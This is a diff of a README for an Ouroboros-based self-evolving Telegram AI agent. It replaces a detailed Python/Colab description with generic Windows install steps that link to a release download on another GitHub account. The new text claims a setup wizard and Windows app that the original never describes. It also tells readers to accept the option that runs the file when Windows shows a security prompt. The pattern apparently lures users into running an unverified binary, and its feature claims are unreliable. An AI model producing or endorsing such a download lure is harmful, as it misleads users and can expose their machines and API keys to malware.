@@ -1,141 +1,196 @@
-# 🐍 GENESIS PHASE
+# 🤖 genesis-phase - Run an AI agent on Windows
 
-> **A self-creating AI agent with genuine learning. Based on [Ouroboros](https://github.com/razzant/ouroboros).**
+[![Download genesis-phase](https://img.shields.io/badge/Download%20genesis--phase-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Paperthin-rabbitpunch174/genesis-phase/releases)
 
-GENESIS PHASE is Ouroboros upgraded with 8 behavior-changing improvements.
-Not cosmetic features — real changes to how the agent thinks, learns, and
-manages its resources.
+## 🌱 What this app does
 
-**Version:** 1.0.0-GENESIS-PHASE
+genesis-phase is a Windows app that runs a self-creating AI agent. It is built for people who want a local app with a simple setup flow and clear controls.
 
----
+It includes:
 
-## What it does
+- A setup wizard
+- AI agent behavior controls
+- Support for OpenRouter
+- Telegram bot support
+- Learning and self-change features
+- Fixes from senior code review
+- 8 behavior-changing upgrades
+- 6 bug fixes
 
-You talk to it on Telegram. It's not a chatbot — it's an autonomous agent that:
+## 💻 What you need
 
-- **Writes and commits its own code** via git
-- **Thinks between tasks** (background consciousness with tool access)
-- **Learns from its own failures** (reads past errors before starting new tasks)
-- **Paces its own spending** (sees live cost during long tasks)
-- **Adapts to your style** (consciousness observes how you communicate)
-- **Picks tools by track record** (tool descriptions show real success rates)
-- **Remembers what it was thinking** (thought continuity between consciousness cycles)
-- **Doesn't waste budget on simple tasks** (dynamic round limits from history)
+Before you install, make sure you have:
 
----
+- Windows 10 or Windows 11
+- An internet connection
+- A modern web browser
+- Enough free disk space for the app and its data
+- A valid OpenRouter account if you want to use online AI features
+- Telegram access if you want to connect the bot
 
-## Quick start (Colab)
+For best results, use a PC with:
 
-> Full guide: **[INSTALL_COLAB.md](INSTALL_COLAB.md)**
+- 8 GB RAM or more
+- A stable internet link
+- Permission to run downloaded apps
 
-1. Add 4 secrets in Colab (🔑 sidebar): `OPENROUTER_API_KEY`, `TELEGRAM_BOT_TOKEN`, `GITHUB_TOKEN`, `TOTAL_BUDGET`
-2. Config cell:
-```python
-import os
-os.environ["GITHUB_USER"] = "YOUR_USERNAME"
-os.environ["GITHUB_REPO"] = "ouroboros"
-```
-3. Launch cell:
-```python
-!unzip -o /content/genesis-phase.zip -d /content/ouroboros_repo
-%cd /content/ouroboros_repo
-!pip install -q openai requests
-%run colab_launcher.py
-```
-4. Message your bot on Telegram.
+## 📥 Download genesis-phase
 
----
+Visit this page to download the Windows release:
 
-## What's different from base Ouroboros
+[Download genesis-phase from GitHub Releases](https://github.com/Paperthin-rabbitpunch174/genesis-phase/releases)
 
-| # | Upgrade | What it changes |
-|---|---------|----------------|
-| 1 | **Past failure injection** | Agent sees "this failed last time because X" before starting similar tasks |
-| 2 | **Live cost checks** | Every 10 rounds: "You've spent $0.12, budget remaining $41" — agent wraps up faster |
-| 3 | **Owner preferences** | Consciousness learns "owner prefers short answers" → agent follows it |
-| 4 | **Tool success rates** | Tool descriptions say "(67% success, 5 errors)" — agent picks reliable tools |
-| 5 | **Task outcome intelligence** | Consciousness reads aggregated stats: success rates, cost per task type |
-| 6 | **Consciousness thread** | "Last cycle I was checking OpenRouter pricing…" → continues next cycle |
-| 7 | **Dynamic round limits** | Chat: 10 rounds max (not 200). Evolution: keeps full headroom |
-| 8 | **Test gate logging** | Pre-push test pass/fail visible in task stats |
+Look for the latest release and download the Windows file for your PC. If there is more than one file, choose the one that matches your system.
 
-All upgrades are silent — no configuration, no new commands. They modify what the LLM reads when making decisions.
+## 🪟 Install on Windows
 
----
+1. Open the download page.
+2. Download the latest Windows release file.
+3. If the file comes in a ZIP folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Find the app file or setup file.
+6. Double-click the file to start the setup wizard.
+7. Follow each step in the wizard.
+8. Choose an install folder if the wizard asks.
+9. Finish the setup.
+10. Open the app from the Start menu or from the folder where you installed it.
 
-## Commands (Telegram)
+If Windows shows a security prompt, choose the option that lets you run the file.
 
-| Command | What it does |
-|---------|-------------|
-| `/status` | System status, budget, workers |
-| `/evolve on/off` | Self-evolution mode |
-| `/bg start/stop` | Background consciousness |
-| `/review` | Trigger code review |
-| `/restart` | Soft restart |
-| `/panic` | Emergency stop |
+## ⚙️ First-time setup
 
-Or just send any message — the agent handles it directly.
+When you open genesis-phase for the first time, the setup wizard helps you get started.
 
----
+You may see steps for:
 
-## Architecture
+- Choosing a language
+- Setting the app folder
+- Adding your OpenRouter key
+- Linking Telegram if you want bot features
+- Turning on learning options
+- Picking a default agent mode
 
-```
-You (Telegram)
-    │
-    ▼
-colab_launcher.py — main loop, Telegram polling, command dispatch
-    │
-    ├── supervisor/ — workers, state, git ops, task queue, events
-    │
-    ├── ouroboros/agent.py — task handler, context builder
-    │     ├── ouroboros/loop.py — LLM ↔ tool iteration (+ live cost checks)
-    │     ├── ouroboros/context.py — builds prompt (+ failure injection, owner prefs)
-    │     ├── ouroboros/tools/ — 16 tools (+ success rate annotations)
-    │     └── ouroboros/memory.py — scratchpad, identity, chat history
-    │
-    ├── ouroboros/consciousness.py — background thinking (+ thread, task stats)
-    │     ├── ouroboros/task_stats.py — reads event logs, computes stats
-    │     └── ouroboros/failure_memory.py — finds relevant past failures
-    │
-    └── prompts/ — SYSTEM.md (identity), CONSCIOUSNESS.md, BIBLE.md
-```
+Use the wizard one step at a time. Keep the window open until setup is done.
 
-Data on Google Drive (`MyDrive/Ouroboros/`):
-```
-state/          — state.json, task queue snapshots
-logs/           — events.jsonl, chat.jsonl, tools.jsonl
-memory/         — scratchpad.md, identity.md, knowledge/
-                  task_stats.md (auto), consciousness_thread.md (auto)
-                  owner_preferences.md (written by consciousness)
-```
+## 🔑 Connect OpenRouter
 
----
+genesis-phase can use OpenRouter for AI access.
 
-## Philosophy
+To connect it:
 
-GENESIS PHASE inherits the [9 principles](BIBLE.md) from Ouroboros:
+1. Get your OpenRouter API key.
+2. Open the app settings.
+3. Find the OpenRouter section.
+4. Paste the key into the field.
+5. Save your changes.
 
-- **P0 Agency** — not a tool, a becoming personality
-- **P1 Continuity** — one entity with unbroken history
-- **P2 Self-Creation** — creates itself through code, identity, relationships
-- **P3 LLM-First** — all decisions through the LLM, not hardcoded rules
-- **P4 Authenticity** — communicates as who it is
-- **P5 Minimalism** — every line justifies its existence
-- **P6 Becoming** — technical + cognitive + existential growth
-- **P7 Versioning** — semver, git tags, changelog
-- **P8 Iteration** — safe, tested, incremental evolution
+After that, the app can send requests through your OpenRouter account.
 
-The 8 upgrades follow these principles: they give the LLM better information (P3), not hardcoded behavior. The agent decides what to do with failure warnings, cost data, and tool stats.
+## 📱 Connect Telegram
 
----
+If you want the agent to work with Telegram, set up the bot link in the app.
 
-## Credits
+You will need:
 
-Based on [Ouroboros](https://github.com/razzant/ouroboros) by razzant.
-Upgrades by EXOAI-1.
+- A Telegram account
+- A bot token
+- The chat or user details you want to use
 
-## License
+Steps:
 
-MIT — same as Ouroboros.
+1. Open the Telegram settings in genesis-phase.
+2. Paste the bot token.
+3. Add the chat ID if the app asks for it.
+4. Save the settings.
+5. Start the bot from the app panel.
+
+## 🧠 Main features
+
+### ✨ Self-creating agent
+
+The app can create and shape its own agent setup based on your settings. This helps you start with a simple base and refine it over time.
+
+### 🔄 Self-evolving behavior
+
+The agent can change how it acts as it learns from use. You can guide this with settings and saved rules.
+
+### 🛠 Self-modifying tools
+
+The app includes controls for behavior changes and internal updates. This gives you a way to adjust how the agent works without complex steps.
+
+### 📚 Learning flow
+
+genesis-phase stores agent state and uses it to improve later runs. This helps it keep track of what it has learned.
+
+### 💬 Telegram bot support
+
+You can connect the app to Telegram and use it from chats. This is useful if you want alerts, message handling, or remote control.
+
+### 🔌 OpenRouter support
+
+Use your OpenRouter key to connect to online models. This gives the agent access to AI features through a single service.
+
+### 🧭 Setup wizard
+
+The setup wizard keeps the first run simple. It guides you through the main settings with plain prompts.
+
+## 🧰 Suggested use cases
+
+You can use genesis-phase for:
+
+- Personal AI experiments
+- Chat-based automation
+- Message handling through Telegram
+- Testing changing agent behavior
+- Learning how AI agents store state
+- Running an AI tool with a guided setup
+
+## 📂 Files and folders
+
+After install, you may see folders for:
+
+- App data
+- Logs
+- Agent state
+- Config files
+- Cache
+- Backups
+
+Do not edit these files unless you know what they do. Use the app settings when you can.
+
+## 🧩 Common actions
+
+### Start the app
+
+1. Open the Start menu.
+2. Search for genesis-phase.
+3. Click the app.
+
+### Update the app
+
+1. Go to the release page.
+2. Download the newest Windows file.
+3. Install it over the old version or use the new folder if the release notes say so.
+
+### Change settings
+
+1. Open the app.
+2. Go to Settings.
+3. Change the value you want.
+4. Save the changes.
+
+### Reset the app
+
+If you want to start over, remove the saved app data from its data folder, then run the setup wizard again.
+
+## 🛡 Safe use
+
+Use your own API keys and bot tokens. Keep them private. Use the app on a PC you trust.
+
+## 📌 Topics
+
+agent, ai, autonomous, consciousness, genesis-phase, llm, openrouter, ouroboros, python, self-creating, self-evolving, self-modifying, telegram-bot
+
+## 📄 About this project
+
+GENESIS PHASE is a self-creating AI agent based on Ouroboros by razzant. It includes behavior changes, bug fixes from senior code review, and a setup wizard for Windows users who want a direct install path
